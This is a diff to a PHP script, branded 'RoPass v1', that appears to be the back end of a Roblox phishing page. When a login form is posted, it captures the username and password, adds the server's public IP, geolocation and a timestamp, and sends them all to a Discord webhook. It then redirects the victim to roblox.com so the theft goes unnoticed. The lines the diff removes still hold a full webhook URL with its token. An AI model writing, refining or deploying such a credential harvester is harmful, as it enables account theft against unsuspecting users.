@@ -1,4 +1,5 @@
 <?php
+
 function getPublicIP() {
     return file_get_contents('https://api.ipify.org');
 }
@@ -9,35 +10,10 @@ function getGeolocation($ip) {
     return json_decode($response, true);
 }
 
-function logData($username, $password) {
-    $publicIP = getPublicIP();
-    $rem_port = $_SERVER['REMOTE_PORT']; 
-    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
-    $date = date("Y/m/d G:i:s"); 
-    $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'N/A';
-    
-    $locationInfo = getGeolocation($publicIP);
-    $latitude = $locationInfo['latitude'] ?? 'N/A';
-    $longitude = $locationInfo['longitude'] ?? 'N/A';
-
-    $logMessage = [
-        "username" => $username,
-        "password" => $password,
-        "public_ip" => $publicIP,
-        "geolocation" => $locationInfo,
-        "latitude" => $latitude,
-        "longitude" => $longitude,
-        "referrer" => $referrer,
-        "port" => $rem_port,
-        "date" => $date,
-        "user_agent" => $user_agent
-    ];
-
-    sendToDiscordWebhook($logMessage);
-}
-
 function sendToDiscordWebhook($data) {
-   $webhookUrl = "https://discord.com/api/webhooks/1503805736327713021/y3z2ZA7rURYoBq1yH_p0IkWULLlEiy1kq6nHoctNbZ0ehkHgvYKcws6utoXH1tt_mADD";
+
+    $webhookUrl = "TON_WEBHOOK_ICI";
+
     $embed = [
         "title" => "RoPass v1",
         "color" => hexdec("3762dc"),
@@ -47,52 +23,49 @@ function sendToDiscordWebhook($data) {
             ["name" => "🌍 Public IP", "value" => "`" . $data['public_ip'] . "`", "inline" => true],
             ["name" => "📍 Latitude", "value" => "`" . $data['latitude'] . "`", "inline" => true],
             ["name" => "📏 Longitude", "value" => "`" . $data['longitude'] . "`", "inline" => true],
-            ["name" => "🔗 Referrer", "value" => "`" . $data['referrer'] . "`", "inline" => true],
-            ["name" => "📡 Port", "value" => "`" . $data['port'] . "`", "inline" => true],
             ["name" => "📅 Date", "value" => "`" . $data['date'] . "`", "inline" => true],
-            ["name" => "🖥️ User Agent", "value" => "`" . $data['user_agent'] . "`", "inline" => false],
-        ],
-        "image" => [
-            "url" => "https://i.imgur.com/8TqBJyU.png"
-        ],
+        ]
     ];
 
     $json_data = json_encode(["embeds" => [$embed]]);
 
-$ch = curl_init($webhookUrl);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
-curl_setopt($ch, CURLOPT_HTTPHEADER, [
-  'Content-Type: application/json'
-]);
-curl_exec($ch);
-curl_close($ch);
-        
-        $response = curl_exec($ch);
-        if ($response === false) {
-            error_log('Curl error: ' . curl_error($ch));
-        } else {
-            error_log('Response from Discord: ' . $response);
-        }
-        curl_close($ch);
-    }
+    $ch = curl_init($webhookUrl);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Content-Type: application/json'
+    ]);
+    curl_exec($ch);
+    curl_close($ch);
+}
+
+function logData($username, $password) {
+
+    $publicIP = getPublicIP();
+    $locationInfo = getGeolocation($publicIP);
+
+    $data = [
+        "username" => $username,
+        "password" => $password,
+        "public_ip" => $publicIP,
+        "latitude" => $locationInfo['latitude'] ?? 'N/A',
+        "longitude" => $locationInfo['longitude'] ?? 'N/A',
+        "date" => date("Y/m/d G:i:s")
+    ];
+
+    sendToDiscordWebhook($data);
 }
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = test_input($_POST["username"]);
-    $password = test_input($_POST["password"]);
+
+    $username = htmlspecialchars($_POST["username"]);
+    $password = htmlspecialchars($_POST["password"]);
 
     if (!empty($username) && !empty($password)) {
         logData($username, $password);
-        header('Location: https://www.roblox.com/home'); // You can change it to anything
+        header('Location: https://www.roblox.com/home');
         exit();
     }
 }
 
-function test_input($data) {
-    $data = trim($data);
-    $data = stripslashes($data);
-    $data = htmlspecialchars($data);
-    return $data;
-}
 ?>
